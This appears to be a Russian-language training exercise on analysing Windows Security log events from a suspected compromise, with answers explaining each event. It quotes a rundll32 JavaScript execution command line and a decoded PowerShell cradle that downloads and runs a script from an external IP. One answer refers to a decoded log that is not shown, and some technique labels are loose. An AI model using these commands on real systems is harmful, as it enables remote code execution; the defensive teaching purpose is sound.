# Практический анализ логов windows
## Поиск аномальных логов 

ВВОДНАЯ:
Корпоративный ноутбук пользователя IVANOV (192.168.1.115)

Установлен виндовс 10

Администратор заметил подозрительную сетевую активность ночью. Выгружены логи Security и System за последний час.

### Лог 1
```
Event ID: 4688 
Время: 03:15:22
Account Name: IVANOV
New Process Name: C:\Windows\System32\rundll32.exe
Parent Process: C:\Users\IVANOV\Downloads\telegram_setup.exe
Command Line: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('test');
```
Ответ:

Создание нового процесса 4688 происходит от имени владельца компьютера, значит кто-то имеет удалённый доступ к нему (вряд ли ночью кто-то получает физический доступ к нему, если только Иванов не лунатик).
в этом логе водно, что запускается процесс в системной папке, а родительский процесс некий telegram_setup. 

Поле alert('test'); указывает, что атакующий тестировал выполнение кода. Это мог быть пробный запуск перед основной атакой.

Это классический признак living-off-the-land (использование легитимных инструментов для атаки).

· Атака: rundll32.exe используется для выполнения JavaScript-кода прямо из командной строки. Это техника DLL Side-Loading или просто выполнение кода через легитимную утилиту.

· Почему опасно: rundll32 обычно запускается из System32 с родителем svchost.exe или explorer.exe. Здесь родитель — скачанный exe из папки Downloads.

· Что делать: Изолировать машину. Этот процесс почти наверняка загрузил полезную нагрузку.

### Лог 2

```
Event ID: 4697 
Время: 03:17:05
Account Name: IVANOV
Service Name: SecurityUpdateService
Service File Name: C:\Windows\System32\svchost.exe -k netsvcs
Image Path: C:\Windows\System32\svchost.exe -k netsvcs
Service Type: user mode service
Start Mode: Auto
```

Ответ:

В легитимной Windows Update служба называется wuauserv, а путь — C:\Windows\System32\svchost.exe -k netsvcs (без указания конкретной DLL). Так что путь формально корректен. 

Подозрение вызывает имя службы, а не путь. Нужно проверить, какая DLL загружается через этот svchost.

· Маскировка: Злоумышленник переименовал малварь в svchost.exe или просто создал службу, которая запускает вредоносный код через легитимный процесс.

· Нужно проверить, какой именно exe физически лежит по пути, указанному в службе. Сверить хеш с VirusTotal.

Конкретная техника MITRE:

T1543.003 — Create or Modify System Process: Windows Service

Очень важно контролировать свою параною и не переусердствовать с подозрениями на ровном месте :)

### Лог 3
```
Event ID: 4624 
Время: 02:45:10
Account Name: IVANOV
Logon Type: 10 (Remote Interactive)
Source Network Address: 192.168.1.45
Process Name: C:\Windows\System32\svchost.exe
```

 Logon Type 10 — это вход по RDP (Remote Desktop)

Ответ:

· RDP (Remote Desktop Protocol) — протокол удаленного рабочего стола Windows.

· Аномалия: Logon Type 10 (RDP) ночью, когда пользователь спит. И источник — другой компьютер в той же сети, похоже устройство .45 было взломанно и злоумышленник пытается 
распространиться на другие компьютеры в сети.

· Сценарий:
  1. Хакер взломал ПК с адресом .45 (через фишинг или еще как).
  2. С него, как из локальной сети, он запустил RDP на ПК Иванова (так проще обойти фаерволы, потому что RDP внутри сети часто разрешен).
  3. Теперь у него доступ к двум машинам.
  
· Что делать: Проверить оба ПК. Узнать у владельца .45, работал ли он ночью.
Также можно предположить, что это инсайдер

```
Event ID: 1102 
Время: 03:20:00
Account Name: IVANOV
Log Name: Security
```

Ответ:

1102 - попытка очистки журнала аудита безопасности. Беря во внимание все логи выше - это самая настоящая попытка заразить компьютер вирусом.
Чистят предыдущие логи в основном для того, чтобы аналитик не увидел предыдущие. 

Это событие высшего приоритета. Машина немедленно изолируется, снимается память (оперативка) для анализа того,
что уже было в логах до очистки (они могли сохраниться в памяти или в резервных копиях).

Ответ:

IEX (New-Object Net.WebClient).DownloadString('http://185.130.5.133/ps.ps1') - это получилось при декодировании. То же самое, что было в логе 4.
Видно, что сперва выполняется пинг локального хоста - это дешевый способ создать паузу на 5 секунд (-n 5). 

Хакер делает это, чтобы антивирус или EDR (система обнаружения на конце) не связали две команды в одну атаку. 
Или чтобы обойти поведенческий анализ, который смотрит на быструю последовательность "процесс → сеть".

Это называется **обфускация**

Главный вопрос: внешняя или внутренняя угроза?
1. Если атака идет с внешнего IP:
   · В логах RDP (Logon Type 10), будет публичный IP, а не 192.168.x.x.
   · Скорее всего, это прямой взлом через открытые порты или фишинг.
2. Если атака идет с внутреннего IP:
   · Это значит, что хакер уже внутри сети. Он либо:
     · Взломал один компьютер и движется по сети (латеральное перемещение).
     · Или это инсайдер.
